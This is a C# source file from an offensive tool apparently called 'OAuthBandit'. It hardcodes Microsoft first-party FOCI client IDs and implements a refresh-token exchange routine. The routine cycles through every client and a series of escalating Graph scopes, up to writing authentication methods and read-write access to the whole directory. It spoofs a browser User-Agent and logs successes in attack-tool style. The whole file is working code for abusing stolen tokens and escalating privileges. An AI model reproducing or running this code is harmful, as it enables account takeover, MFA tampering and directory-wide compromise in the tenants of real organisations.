using System.Net;
using System.Text;
using System.Text.Json;
using OAuthBandit.Core;

namespace OAuthBandit.Mfa;

public static class FociClients
{
    public static readonly Dictionary<string, string> All = new()
    {
        ["office"] = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        ["teams"] = "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
        ["outlook"] = "27922004-5251-4030-b22d-91ecd9a37ea4",
        ["azure_cli"] = "04b07795-8ddb-461a-bbee-02f9e1bf7b46",
        ["graph_explorer"] = "de8bc8b5-d9f9-48b1-a8ad-b748da725064",
        ["edge"] = "ecd6b820-32c2-49b6-98a6-444530e5a77a",
    };
}

public class TokenExchangeService
{
    private static readonly HttpClient Http = new()
    {
        Timeout = TimeSpan.FromSeconds(15),
        DefaultRequestHeaders = { { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" } }
    };

    private readonly string _tokenUrl;

    public TokenExchangeService(string tenantId = "common")
    {
        _tokenUrl = $"https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token";
    }

    public TokenResponse? ExchangeRefreshToken(string refreshToken, string? clientId = null, string? scope = null)
    {
        clientId ??= FociClients.All["office"];
        scope ??= "https://graph.microsoft.com/.default offline_access";

        var data = new Dictionary<string, string>
        {
            ["grant_type"] = "refresh_token",
            ["refresh_token"] = refreshToken,
            ["client_id"] = clientId,
            ["scope"] = scope
        };

        return PostTokenRequest(data);
    }

    public (string clientName, TokenResponse response)? TryFociExchange(string refreshToken, bool verbose = true)
    {
        string[] scopesToTry =
        {
            "https://graph.microsoft.com/.default offline_access",
            "https://graph.microsoft.com/UserAuthenticationMethod.ReadWrite offline_access",
            "https://graph.microsoft.com/User.ReadWrite.All Directory.ReadWrite.All offline_access"
        };

        foreach (var (clientName, clientId) in FociClients.All)
        {
            foreach (var scope in scopesToTry)
            {
                try
                {
                    var result = ExchangeRefreshToken(refreshToken, clientId, scope);
                    if (result != null)
                    {
                        if (verbose)
                        {
                            var scopeDisplay = result.Scope.Length > 80 ? result.Scope[..80] + "..." : result.Scope;
                            Console.WriteLine($"    [+] Token exchange OK via {clientName}: {scopeDisplay}");
                        }
                        return (clientName, result);
                    }
                }
                catch { }
            }
        }

        return null;
    }

    private TokenResponse? PostTokenRequest(Dictionary<string, string> data)
    {
        try
        {
            var content = new FormUrlEncodedContent(data);
            var response = Http.PostAsync(_tokenUrl, content).Result;

            if (!response.IsSuccessStatusCode)
                return null;

            var json = response.Content.ReadAsStringAsync().Result;
            using var result = JsonDocument.Parse(json);
            var root = result.RootElement;

            return new TokenResponse
            {
                AccessToken = root.TryGetProperty("access_token", out var at) ? at.GetString()! : "",
                RefreshToken = root.TryGetProperty("refresh_token", out var rt) ? rt.GetString() : null,
                TokenType = root.TryGetProperty("token_type", out var tt) ? tt.GetString()! : "Bearer",
                ExpiresIn = root.TryGetProperty("expires_in", out var ei) ? ei.GetInt32() : 3600,
                Scope = root.TryGetProperty("scope", out var sc) ? sc.GetString()! : "",
                IdToken = root.TryGetProperty("id_token", out var id) ? id.GetString() : null
            };
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] Token exchange error: {ex.Message}");
            return null;
        }
    }
}
